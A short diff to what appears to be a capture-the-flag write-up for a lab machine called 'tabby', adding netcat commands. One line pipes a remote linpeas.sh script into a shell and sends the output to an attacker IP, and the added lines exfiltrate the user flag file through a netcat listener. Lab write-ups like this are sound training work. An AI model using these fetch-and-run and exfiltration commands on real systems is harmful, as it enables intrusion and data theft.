@@ -365,3 +365,15 @@ tail -n+1 -F linpeas_ash.log # blocking.
 # on tabby/ash:
 curl 10.10.14.69/linpeas.sh | sh | nc 10.10.14.69 12345
 ```
+
+Exfiltrate the user flag:
+
+```sh
+# on kali:
+nc -lnvp 12345 > user.txt
+
+# on tabby/ash:
+# /home/ash/user.txt | nc -q0 10.10.14.69 12345
+# or:
+# nc -q0 10.10.14.69 12345 < /home/ash/user.txt
+```
